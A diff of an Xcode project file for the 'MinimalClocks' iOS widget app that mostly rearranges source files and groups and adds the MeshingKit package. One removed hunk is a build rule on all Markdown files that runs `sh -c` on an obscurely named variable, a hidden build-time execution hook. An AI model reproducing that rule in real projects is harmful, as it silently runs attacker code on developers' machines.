@@ -3,11 +3,27 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 70;
+	objectVersion = 56;
 	objects = {
 
 /* Begin PBXBuildFile section */
-		347037818BC34E2CA2A5DE54 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 90B1714233614A49BDA5DE54 /* README.md */; };
+		E150B87341BA4A419BA5DE54 /* README.md */ = {isa = PBXBuildFile; fileRef = 076BC41A81C1449B87A5DE54; };
+		673723972F044DD4006633CF /* MeshingKit in Frameworks */ = {isa = PBXBuildFile; productRef = 673723962F044DD4006633CF /* MeshingKit */; };
+		673723992F045819006633CF /* Haptic.swift in Sources */ = {isa = PBXBuildFile; fileRef = 673723982F045819006633CF /* Haptic.swift */; };
+		6737239A2F045819006633CF /* Haptic.swift in Sources */ = {isa = PBXBuildFile; fileRef = 673723982F045819006633CF /* Haptic.swift */; };
+		677CE6372F02E4F90074C62F /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6322F02E4F90074C62F /* ContentView.swift */; };
+		677CE6382F02E4F90074C62F /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6332F02E4F90074C62F /* LoginView.swift */; };
+		677CE6392F02E4F90074C62F /* ProfileView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6342F02E4F90074C62F /* ProfileView.swift */; };
+		677CE63A2F02E4F90074C62F /* WidgetAddGuideView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6352F02E4F90074C62F /* WidgetAddGuideView.swift */; };
+		677CE63B2F02E4F90074C62F /* WidgetExplanationSheetView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6362F02E4F90074C62F /* WidgetExplanationSheetView.swift */; };
+		677CE6402F02E70B0074C62F /* AuthenticationViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE63E2F02E70B0074C62F /* AuthenticationViewModel.swift */; };
+		677CE6442F02E7190074C62F /* ProgressTypeSelection.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6412F02E7190074C62F /* ProgressTypeSelection.intentdefinition */; };
+		677CE6452F02E7190074C62F /* WeatherAQIIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6422F02E7190074C62F /* WeatherAQIIntent.intentdefinition */; };
+		677CE6462F02E7190074C62F /* ProgressTypeSelection.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6412F02E7190074C62F /* ProgressTypeSelection.intentdefinition */; };
+		677CE6472F02E7190074C62F /* WeatherAQIIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6422F02E7190074C62F /* WeatherAQIIntent.intentdefinition */; };
+		677CE6492F02E78D0074C62F /* DateTimePickerProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6482F02E78D0074C62F /* DateTimePickerProvider.swift */; };
+		677CE64A2F02E78D0074C62F /* DateTimePickerProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE6482F02E78D0074C62F /* DateTimePickerProvider.swift */; };
+		677CE64E2F02FF4D0074C62F /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 677CE64D2F02FF4D0074C62F /* LoginViewModel.swift */; };
 		6781AE852EF87DD90006F532 /* LocationHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6781AE842EF87DD90006F532 /* LocationHandler.swift */; };
 		6781AE862EF87DD90006F532 /* LocationHandler.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6781AE842EF87DD90006F532 /* LocationHandler.swift */; };
 		6E060F742ECC2106008101EA /* WeatherAQIRepository.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E060F732ECC2106008101EA /* WeatherAQIRepository.swift */; };
@@ -20,10 +36,6 @@
 		6E0E6EA62D32E70A00321129 /* DayProgressCircleWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E0E6EA12D32E5BF00321129 /* DayProgressCircleWidget.swift */; };
 		6E0E6EB02D33A1A200321129 /* Util.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E0E6EAF2D33A1A200321129 /* Util.swift */; };
 		6E0E6EB12D33A1A200321129 /* Util.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E0E6EAF2D33A1A200321129 /* Util.swift */; };
-		6E0E6EB32D33B6D600321129 /* ProgressTypeSelection.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 6E0E6EB22D33B6D600321129 /* ProgressTypeSelection.intentdefinition */; };
-		6E0E6EB42D33B6D600321129 /* ProgressTypeSelection.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 6E0E6EB22D33B6D600321129 /* ProgressTypeSelection.intentdefinition */; };
-		6E20A61D2D397D560007A16D /* ExperimentGradients.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E20A61C2D397D560007A16D /* ExperimentGradients.swift */; };
-		6E20A61E2D39819B0007A16D /* ExperimentGradients.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E20A61C2D397D560007A16D /* ExperimentGradients.swift */; };
 		6E3EA2862E84F2BC0018D904 /* WidgetButtonView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E3EA2842E84F2BC0018D904 /* WidgetButtonView.swift */; };
 		6E3EA2882E84F3160018D904 /* WidgetInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E3EA2872E84F3160018D904 /* WidgetInfo.swift */; };
 		6E3EA2892E84F3160018D904 /* WidgetInfo.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E3EA2872E84F3160018D904 /* WidgetInfo.swift */; };
@@ -35,7 +47,6 @@
 		6E5E06982EB3011800B44654 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 6E5E06972EB3011800B44654 /* GoogleService-Info.plist */; };
 		6E5E069A2EB308DE00B44654 /* AuthenticationError.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E5E06992EB308DE00B44654 /* AuthenticationError.swift */; };
 		6E5E069B2EB308DE00B44654 /* AuthenticationError.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E5E06992EB308DE00B44654 /* AuthenticationError.swift */; };
-		6E5E069D2EB30D3A00B44654 /* AuthenticationViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E5E069C2EB30D3A00B44654 /* AuthenticationViewModel.swift */; };
 		6E6CBE0F2D3B78D500C8521C /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 6E6CBE0E2D3B78D500C8521C /* FirebaseFirestore */; };
 		6E6CBE132D3B79A400C8521C /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 6E6CBE122D3B79A400C8521C /* FirebaseAnalytics */; };
 		6E6CBE152D3BC5F800C8521C /* Quote.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E6CBE142D3BC5F800C8521C /* Quote.swift */; };
@@ -62,11 +73,8 @@
 		6E84D6B42D31A78F00EE28CB /* MinimalClocksApp.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E84D6B32D31A78F00EE28CB /* MinimalClocksApp.swift */; };
 		6E84D6B82D31A79200EE28CB /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 6E84D6B72D31A79200EE28CB /* Assets.xcassets */; };
 		6E84D6BB2D31A79200EE28CB /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 6E84D6BA2D31A79200EE28CB /* Preview Assets.xcassets */; };
-		6E84D6E12D31A86500EE28CB /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 6E84D6E02D31A86500EE28CB /* WidgetKit.framework */; };
-		6E84D6E32D31A86500EE28CB /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 6E84D6E22D31A86500EE28CB /* SwiftUI.framework */; };
 		6E84D6E62D31A86500EE28CB /* MinimalClocksWidgetBundle.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E84D6E52D31A86500EE28CB /* MinimalClocksWidgetBundle.swift */; };
 		6E84D6E82D31A86500EE28CB /* MinimalClocksWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E84D6E72D31A86500EE28CB /* MinimalClocksWidget.swift */; };
-		6E84D6EA2D31A86800EE28CB /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 6E84D6E92D31A86800EE28CB /* Assets.xcassets */; };
 		6E84D6EE2D31A86800EE28CB /* MinimalClocksWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 6E84D6DE2D31A86500EE28CB /* MinimalClocksWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 		6E84D6F32D31A89E00EE28CB /* DateView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E84D6F22D31A89E00EE28CB /* DateView.swift */; };
 		6E84D6F42D31AEC900EE28CB /* DateView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E84D6F22D31A89E00EE28CB /* DateView.swift */; };
@@ -79,8 +87,6 @@
 		6E88EB7D2EBDA00200AECE93 /* GoogleAirQualityResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E88EB7C2EBDA00200AECE93 /* GoogleAirQualityResponse.swift */; };
 		6E88EB7E2EBDA00200AECE93 /* GoogleAirQualityResponse.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E88EB7C2EBDA00200AECE93 /* GoogleAirQualityResponse.swift */; };
 		6E88EB7F2EBDA03A00AECE93 /* WeatherAQIWidgetView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E88EB782EBD9FED00AECE93 /* WeatherAQIWidgetView.swift */; };
-		6E88EB812EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 6E88EB802EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition */; };
-		6E88EB822EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition in Sources */ = {isa = PBXBuildFile; fileRef = 6E88EB802EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition */; };
 		6E88EB832EBDA33900AECE93 /* WeatherAQIWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E88EB742EBD9FD200AECE93 /* WeatherAQIWidget.swift */; };
 		6E88EB842EBDAC7300AECE93 /* WeatherAQIDataFetcher.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E88EB762EBD9FE500AECE93 /* WeatherAQIDataFetcher.swift */; };
 		6E9D5B2F2EC43C6A0017FC43 /* AppGroupStorage.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6E9D5B2E2EC43C6A0017FC43 /* AppGroupStorage.swift */; };
@@ -94,7 +100,6 @@
 		6EBB91672EE9EA5300561512 /* LocationSearchView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EBB91642EE9EA5300561512 /* LocationSearchView.swift */; };
 		6EBB91682EE9EA5300561512 /* WidgetExplanationSheet.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EBB91652EE9EA5300561512 /* WidgetExplanationSheet.swift */; };
 		6ED30DA32EB6503B001D37AC /* DateDayView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DA22EB6503B001D37AC /* DateDayView.swift */; };
-		6ED30DA52EB65061001D37AC /* DateTimePickerProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DA42EB65061001D37AC /* DateTimePickerProvider.swift */; };
 		6ED30DA62EB65179001D37AC /* DateDayView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DA22EB6503B001D37AC /* DateDayView.swift */; };
 		6ED30DC32EB72B49001D37AC /* UserManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DC22EB72B49001D37AC /* UserManager.swift */; };
 		6ED30DCD2EB736B2001D37AC /* PillButtonView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6ED30DCC2EB736B2001D37AC /* PillButtonView.swift */; };
@@ -107,22 +112,6 @@
 		6EEA728B2D329A6B00A97FF8 /* DayProgressBarWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EEA728A2D329A6B00A97FF8 /* DayProgressBarWidget.swift */; };
 		6EEA728C2D329A6B00A97FF8 /* DayProgressBarWidget.swift in Sources */ = {isa = PBXBuildFile; fileRef = 6EEA728A2D329A6B00A97FF8 /* DayProgressBarWidget.swift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		4FF6A52AA1014EE3A3A5DE54 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A45ED5A}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		6E84D6EC2D31A86800EE28CB /* PBXContainerItemProxy */ = {
@@ -149,6 +138,18 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		076BC41A81C1449B87A5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		673723982F045819006633CF /* Haptic.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Haptic.swift; sourceTree = "<group>"; };
+		677CE6322F02E4F90074C62F /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
+		677CE6332F02E4F90074C62F /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
+		677CE6342F02E4F90074C62F /* ProfileView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileView.swift; sourceTree = "<group>"; };
+		677CE6352F02E4F90074C62F /* WidgetAddGuideView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WidgetAddGuideView.swift; sourceTree = "<group>"; };
+		677CE6362F02E4F90074C62F /* WidgetExplanationSheetView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WidgetExplanationSheetView.swift; sourceTree = "<group>"; };
+		677CE63E2F02E70B0074C62F /* AuthenticationViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthenticationViewModel.swift; sourceTree = "<group>"; };
+		677CE6412F02E7190074C62F /* ProgressTypeSelection.intentdefinition */ = {isa = PBXFileReference; lastKnownFileType = file.intentdefinition; path = ProgressTypeSelection.intentdefinition; sourceTree = "<group>"; };
+		677CE6422F02E7190074C62F /* WeatherAQIIntent.intentdefinition */ = {isa = PBXFileReference; lastKnownFileType = file.intentdefinition; path = WeatherAQIIntent.intentdefinition; sourceTree = "<group>"; };
+		677CE6482F02E78D0074C62F /* DateTimePickerProvider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateTimePickerProvider.swift; sourceTree = "<group>"; };
+		677CE64D2F02FF4D0074C62F /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		6781AE842EF87DD90006F532 /* LocationHandler.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationHandler.swift; sourceTree = "<group>"; };
 		6E060F732ECC2106008101EA /* WeatherAQIRepository.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WeatherAQIRepository.swift; sourceTree = "<group>"; };
 		6E0BAA682D53D68C009CC1A0 /* SigninUsingEmailView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SigninUsingEmailView.swift; sourceTree = "<group>"; };
@@ -156,15 +157,12 @@
 		6E0E6EA12D32E5BF00321129 /* DayProgressCircleWidget.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressCircleWidget.swift; sourceTree = "<group>"; };
 		6E0E6EA32D32E6A500321129 /* DayProgressCircleView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressCircleView.swift; sourceTree = "<group>"; };
 		6E0E6EAF2D33A1A200321129 /* Util.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Util.swift; sourceTree = "<group>"; };
-		6E0E6EB22D33B6D600321129 /* ProgressTypeSelection.intentdefinition */ = {isa = PBXFileReference; lastKnownFileType = file.intentdefinition; path = ProgressTypeSelection.intentdefinition; sourceTree = "<group>"; };
-		6E20A61C2D397D560007A16D /* ExperimentGradients.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ExperimentGradients.swift; sourceTree = "<group>"; };
 		6E3EA2842E84F2BC0018D904 /* WidgetButtonView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WidgetButtonView.swift; sourceTree = "<group>"; };
 		6E3EA2872E84F3160018D904 /* WidgetInfo.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WidgetInfo.swift; sourceTree = "<group>"; };
 		6E44277B2D551DF300A51000 /* String+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+.swift"; sourceTree = "<group>"; };
 		6E4BF30D2EE73D5C00F3E6CC /* WAQIAirQualityResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WAQIAirQualityResponse.swift; sourceTree = "<group>"; };
 		6E5E06972EB3011800B44654 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		6E5E06992EB308DE00B44654 /* AuthenticationError.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthenticationError.swift; sourceTree = "<group>"; };
-		6E5E069C2EB30D3A00B44654 /* AuthenticationViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AuthenticationViewModel.swift; sourceTree = "<group>"; };
 		6E6CBE142D3BC5F800C8521C /* Quote.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Quote.swift; sourceTree = "<group>"; };
 		6E6CBE172D3BC60C00C8521C /* User.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = User.swift; sourceTree = "<group>"; };
 		6E6CBE1A2D3BC65900C8521C /* QuoteUploader.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = QuoteUploader.swift; sourceTree = "<group>"; };
@@ -180,11 +178,8 @@
 		6E84D6B72D31A79200EE28CB /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		6E84D6BA2D31A79200EE28CB /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
 		6E84D6DE2D31A86500EE28CB /* MinimalClocksWidgetExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = MinimalClocksWidgetExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
-		6E84D6E02D31A86500EE28CB /* WidgetKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = WidgetKit.framework; path = System/Library/Frameworks/WidgetKit.framework; sourceTree = SDKROOT; };
-		6E84D6E22D31A86500EE28CB /* SwiftUI.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = SwiftUI.framework; path = System/Library/Frameworks/SwiftUI.framework; sourceTree = SDKROOT; };
 		6E84D6E52D31A86500EE28CB /* MinimalClocksWidgetBundle.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MinimalClocksWidgetBundle.swift; sourceTree = "<group>"; };
 		6E84D6E72D31A86500EE28CB /* MinimalClocksWidget.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MinimalClocksWidget.swift; sourceTree = "<group>"; };
-		6E84D6E92D31A86800EE28CB /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		6E84D6EB2D31A86800EE28CB /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
 		6E84D6F22D31A89E00EE28CB /* DateView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateView.swift; sourceTree = "<group>"; };
 		6E84D6F52D31BA5F00EE28CB /* TypographySystem.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TypographySystem.swift; sourceTree = "<group>"; };
@@ -194,14 +189,12 @@
 		6E88EB762EBD9FE500AECE93 /* WeatherAQIDataFetcher.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WeatherAQIDataFetcher.swift; sourceTree = "<group>"; };
 		6E88EB782EBD9FED00AECE93 /* WeatherAQIWidgetView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WeatherAQIWidgetView.swift; sourceTree = "<group>"; };
 		6E88EB7C2EBDA00200AECE93 /* GoogleAirQualityResponse.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GoogleAirQualityResponse.swift; sourceTree = "<group>"; };
-		6E88EB802EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition */ = {isa = PBXFileReference; lastKnownFileType = file.intentdefinition; path = WeatherAQIIntent.intentdefinition; sourceTree = "<group>"; };
 		6E9D5B2E2EC43C6A0017FC43 /* AppGroupStorage.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppGroupStorage.swift; sourceTree = "<group>"; };
 		6EA0F99E2D3EBB1800785B58 /* Error+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Error+.swift"; sourceTree = "<group>"; };
 		6EA0F9A12D3EBCBA00785B58 /* Date+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Date+.swift"; sourceTree = "<group>"; };
 		6EBB91642EE9EA5300561512 /* LocationSearchView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LocationSearchView.swift; sourceTree = "<group>"; };
 		6EBB91652EE9EA5300561512 /* WidgetExplanationSheet.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WidgetExplanationSheet.swift; sourceTree = "<group>"; };
 		6ED30DA22EB6503B001D37AC /* DateDayView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateDayView.swift; sourceTree = "<group>"; };
-		6ED30DA42EB65061001D37AC /* DateTimePickerProvider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DateTimePickerProvider.swift; sourceTree = "<group>"; };
 		6ED30DC22EB72B49001D37AC /* UserManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserManager.swift; sourceTree = "<group>"; };
 		6ED30DCC2EB736B2001D37AC /* PillButtonView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PillButtonView.swift; sourceTree = "<group>"; };
 		6ED30DCE2EB765DC001D37AC /* MailComposerViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MailComposerViewController.swift; sourceTree = "<group>"; };
@@ -209,12 +202,7 @@
 		6ED8489E2E7BB68D0080E69A /* MinimalClocksWidgetExtension.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = MinimalClocksWidgetExtension.entitlements; sourceTree = "<group>"; };
 		6EEA72832D327ECC00A97FF8 /* DayProgressBarView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressBarView.swift; sourceTree = "<group>"; };
 		6EEA728A2D329A6B00A97FF8 /* DayProgressBarWidget.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayProgressBarWidget.swift; sourceTree = "<group>"; };
-		90B1714233614A49BDA5DE54 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
-
-/* Begin PBXFileSystemSynchronizedRootGroup section */
-		6EA4A6092EB1C5D6007FFDB5 /* New Folder */ = {isa = PBXFileSystemSynchronizedRootGroup; explicitFileTypes = {}; explicitFolders = (); path = "New Folder"; sourceTree = "<group>"; };
-/* End PBXFileSystemSynchronizedRootGroup section */
 
 /* Begin PBXFrameworksBuildPhase section */
 		6E84D6AD2D31A78F00EE28CB /* Frameworks */ = {
@@ -226,6 +214,7 @@
 				6E5E06962EB2FF7600B44654 /* GoogleSignInSwift in Frameworks */,
 				6E6CBE0F2D3B78D500C8521C /* FirebaseFirestore in Frameworks */,
 				6E6CBE202D3BC7ED00C8521C /* FirebaseCore in Frameworks */,
+				673723972F044DD4006633CF /* MeshingKit in Frameworks */,
 				6E6CBE132D3B79A400C8521C /* FirebaseAnalytics in Frameworks */,
 				6E5E06942EB2FF7600B44654 /* GoogleSignIn in Frameworks */,
 			);
@@ -235,16 +224,32 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				6E84D6E32D31A86500EE28CB /* SwiftUI.framework in Frameworks */,
 				6E6CBE242D3BCA6200C8521C /* FirebaseFirestore in Frameworks */,
 				6E6CBE222D3BCA6200C8521C /* FirebaseCore in Frameworks */,
-				6E84D6E12D31A86500EE28CB /* WidgetKit.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		677CE63F2F02E70B0074C62F /* ViewModels */ = {
+			isa = PBXGroup;
+			children = (
+				677CE64D2F02FF4D0074C62F /* LoginViewModel.swift */,
+				677CE63E2F02E70B0074C62F /* AuthenticationViewModel.swift */,
+			);
+			path = ViewModels;
+			sourceTree = "<group>";
+		};
+		677CE6432F02E7190074C62F /* Intents */ = {
+			isa = PBXGroup;
+			children = (
+				677CE6412F02E7190074C62F /* ProgressTypeSelection.intentdefinition */,
+				677CE6422F02E7190074C62F /* WeatherAQIIntent.intentdefinition */,
+			);
+			path = Intents;
+			sourceTree = "<group>";
+		};
 		6E0784502D35853900A0E654 /* Widget-DayProgressCircle */ = {
 			isa = PBXGroup;
 			children = (
@@ -268,6 +273,7 @@
 			children = (
 				6E84D6E72D31A86500EE28CB /* MinimalClocksWidget.swift */,
 				6E84D6F22D31A89E00EE28CB /* DateView.swift */,
+				677CE6482F02E78D0074C62F /* DateTimePickerProvider.swift */,
 			);
 			path = "Widget-DayDateMonthAbv";
 			sourceTree = "<group>";
@@ -287,16 +293,9 @@
 			children = (
 				6E6CBE372D3D0C1B00C8521C /* MotivationalQuoteWidget.swift */,
 				6E6CBE3A2D3D0C7400C8521C /* MotivationalQuoteView.swift */,
-			);
-			path = "Widget-MotiovationalQuote";
-			sourceTree = "<group>";
-		};
-		6E6CBE3F2D3D0EC500C8521C /* WidgetEntries */ = {
-			isa = PBXGroup;
-			children = (
 				6E6CBE3D2D3D0EB900C8521C /* DayProgressWidgetTimelineEntry.swift */,
 			);
-			path = WidgetEntries;
+			path = "Widget-MotiovationalQuote";
 			sourceTree = "<group>";
 		};
 		6E6CBE402D3D0F4200C8521C /* Util */ = {
@@ -311,13 +310,10 @@
 		6E84D6A72D31A78F00EE28CB = {
 			isa = PBXGroup;
 			children = (
-				6E88EB802EBDA19100AECE93 /* WeatherAQIIntent.intentdefinition */,
-				6ED8489E2E7BB68D0080E69A /* MinimalClocksWidgetExtension.entitlements */,
-				6E0E6EB22D33B6D600321129 /* ProgressTypeSelection.intentdefinition */,
+				677CE6432F02E7190074C62F /* Intents */,
 				6E84D6B22D31A78F00EE28CB /* MinimalClocks */,
 				6E84D6E42D31A86500EE28CB /* MinimalClocksWidget */,
-				6E84D6E92D31A86800EE28CB /* Assets.xcassets */,
-				6E84D6DF2D31A86500EE28CB /* Frameworks */,
+				6ED8489E2E7BB68D0080E69A /* MinimalClocksWidgetExtension.entitlements */,
 				6E84D6B12D31A78F00EE28CB /* Products */,
 			);
 			sourceTree = "<group>";
@@ -325,7 +321,7 @@
 		6E84D6B12D31A78F00EE28CB /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				90B1714233614A49BDA5DE54 /* README.md */,
+				076BC41A81C1449B87A5DE54 /* README.md */,
 				6E84D6B02D31A78F00EE28CB /* MinimalClocks.app */,
 				6E84D6DE2D31A86500EE28CB /* MinimalClocksWidgetExtension.appex */,
 			);
@@ -335,23 +331,19 @@
 		6E84D6B22D31A78F00EE28CB /* MinimalClocks */ = {
 			isa = PBXGroup;
 			children = (
-				6EBB91662EE9EA5300561512 /* Views */,
-				6E5E069C2EB30D3A00B44654 /* AuthenticationViewModel.swift */,
 				6ED8489D2E7BB3DC0080E69A /* MinimalClocks.entitlements */,
-				6E84D7192D31BF2200EE28CB /* Info.plist */,
 				6E5E06972EB3011800B44654 /* GoogleService-Info.plist */,
+				6E84D7192D31BF2200EE28CB /* Info.plist */,
 				6E84D6B32D31A78F00EE28CB /* MinimalClocksApp.swift */,
-				6EA4A6092EB1C5D6007FFDB5 /* New Folder */,
-				6E84D7142D31BBBA00EE28CB /* Resources */,
 				6E84D6B72D31A79200EE28CB /* Assets.xcassets */,
-				6E84D6B92D31A79200EE28CB /* Preview Content */,
-				6E84D7152D31BC9C00EE28CB /* Helpers */,
-				6E20A61C2D397D560007A16D /* ExperimentGradients.swift */,
